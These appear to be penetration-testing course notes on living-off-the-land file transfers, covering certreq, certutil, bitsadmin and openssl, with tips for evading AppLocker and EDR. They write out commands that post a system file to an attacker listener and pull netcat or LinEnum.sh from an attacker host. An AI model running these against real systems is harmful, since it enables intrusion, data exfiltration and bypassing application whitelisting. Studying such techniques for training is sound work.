# NOTES — Living off The Land

## ID
622

## Module
File Transfers

## Kind
notes

## Title
Section 8 — Living off The Land

## Description
Use LOLBAS (Windows) and GTFOBins (Linux) signed/trusted binaries — certreq, certutil, bitsadmin, openssl — to perform file transfers in environments with application whitelisting.

## Tags
lolbas, gtfobins, lolbins, certreq, certutil, bitsadmin, openssl, applocker, whitelisting

## Commands
- `certreq.exe -Post -config http://<ip>:8000/ c:\windows\win.ini`
- `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem`
- `openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh`
- `openssl s_client -connect <ip>:80 -quiet > LinEnum.sh`
- `bitsadmin /transfer wcb /priority foreground http://<ip>:8000/nc.exe C:\Users\<u>\Desktop\nc.exe`
- `Import-Module bitstransfer; Start-BitsTransfer -Source "http://<ip>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"`
- `certutil.exe -verifyctl -split -f http://<ip>:8000/nc.exe`
- `certutil -urlcache -split -f http://<ip>:8000/nc.exe`

## What This Section Covers
"LOLBins" / "misplaced-trust binaries" — signed binaries Microsoft (or distros) ship that have **secondary functionality** an attacker can abuse for file transfer, code execution, bypass, etc. Application whitelisting (AppLocker, WDAC) often permits these because they're signed by trusted vendors.

## Reference Sites

| OS | Project | URL filter for downloads/uploads |
|----|---------|----------------------------------|
| Windows | LOLBAS | `/download/`, `/upload/` URI paths |
| Linux | GTFOBins | `+file download`, `+file upload` tags |

Useful function categories: Download, Upload, Command Execution, File Read, File Write, Bypasses.

## Windows — LOLBAS Examples

### `certreq.exe` — Upload via POST
1. Attacker: `sudo nc -lvnp 8000`
2. Target: `certreq.exe -Post -config http://<ip>:8000/ c:\windows\win.ini`

The receiving Netcat catches a POST with the file contents:
```
POST / HTTP/1.1
User-Agent: Mozilla/4.0 (compatible; Win32; NDES client 10.0.19041.1466/vb_release_svc_prod1)
Host: <ip>:8000
Content-Length: 92

; for 16-bit app support
[fonts]
...
```

> Older `certreq.exe` versions lack `-Post`. Replace with an updated build if needed.

### `bitsadmin` — Background Download via BITS
```cmd
bitsadmin /transfer wcb /priority foreground http://<ip>:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe
```
- `wcb` = arbitrary job name.
- `/priority foreground` overrides BITS's "smart" throttling so it goes fast.

### `Start-BitsTransfer` (PowerShell wrapper for BITS)
```powershell
Import-Module bitstransfer
Start-BitsTransfer -Source "http://<ip>:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"
```
Supports credentials and proxy specifications natively.

### `certutil` — Download
Casey Smith's classic — historically the de-facto wget for Windows:
```cmd
certutil.exe -verifyctl -split -f http://<ip>:8000/nc.exe
certutil -urlcache -split -f http://<ip>:8000/nc.exe
```

> **AMSI detects this now** — modern Defender flags `certutil` downloads as malicious. Still useful in older / weakened environments, but not stealthy by default.

### Other notable LOLBAS download primitives
- `GfxDownloadWrapper.exe` (Intel Graphics Driver) — downloads to arbitrary path; often permitted by AppLocker.
- `mshta`, `regsvr32`, `wmic` (`/Format`) — execution + download primitives (covered in detection sections).

## Linux — GTFOBins Examples

### `openssl s_server` / `s_client` — Netcat-style transfer over TLS
1. Generate cert (attacker):
   ```bash
   openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem
   ```
2. Stand up TLS file server (attacker):
   ```bash
   openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh
   ```
3. Pull from target:
   ```bash
   openssl s_client -connect <attacker-ip>:80 -quiet > LinEnum.sh
   ```

This pattern works on near-every Linux box — openssl is essentially universal.

## Workflow — Picking a LOLBin

1. **Identify the constraint** — what's blocked? PowerShell? Outbound :80? File-write?
2. **Filter the LOLBAS/GTFOBins index** by function — Download/Upload.
3. **Check Microsoft-signed / distro-default status** — the more obscure, the less likely an EDR/AppLocker rule covers it.
4. **Test in a known-good env first** — some require specific OS versions, .NET assemblies, or service states.

## Lab — Questions & Answers
Source content does not include lab question text or answers (only the optional exercise prompt).

## Key Takeaways
- LOLBAS / GTFOBins are *the* reference for AppLocker / SELinux / EDR bypass attempts via signed binaries. Bookmark them.
- `certreq` for upload is underused vs `certutil` for download — defenders often only watch the latter.
- BITS via `Start-BitsTransfer` looks like Windows Update traffic to many monitoring tools — it's the User-Agent `Microsoft BITS/7.8` that gives it away (see [[09-detection]]).
- LOLBin selection is **environment-specific** — what bypasses AppLocker at one client may be explicitly blocked at the next. Have multiple options ready.

## Gotchas
- Older `certreq.exe` lacks `-Post`. New `bitsadmin` syntax differs from old `bitsadmin` (`/transfer` syntax stable, but `/SetCustomHeaders` etc. version-dependent).
- `certutil` downloads are AMSI-detected on modern Defender — don't assume it bypasses anything.
- BITS jobs persist after reboot if not completed/cancelled — `bitsadmin /list` to find lingering jobs; `bitsadmin /cancel <job>` to clean up.
- `openssl s_client` will exit immediately when stdin closes — make sure you redirect output (`> file`) and that the server side is set up first.

<!-- AUTO-LINKS-START -->
---
**Module:** [[00-overview|file-transfers]]
← [[07-catching-files-over-https]] | [[09-detection]] →
<!-- AUTO-LINKS-END -->
